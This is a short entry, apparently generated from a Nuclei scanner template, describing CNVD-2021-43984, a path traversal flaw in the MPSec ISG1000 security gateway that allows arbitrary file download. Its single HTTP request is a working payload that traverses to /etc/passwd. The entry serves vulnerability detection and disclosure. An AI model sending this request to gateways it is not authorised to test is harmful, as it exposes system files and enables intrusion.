# Nuclei Template: MPSec ISG1000 Security Gateway - Arbitrary File Download
**Template ID:** CNVD-2021-43984
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`CNVD-2021-43984.yaml`)

## Vulnerability Information & PoC

## Description
The MPSec ISG1000 safety gateway at MP Communications Technology Co., Ltd. has any file download loophole, and attackers can use the loophole to obtain sensitive information.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../etc/passwd
```
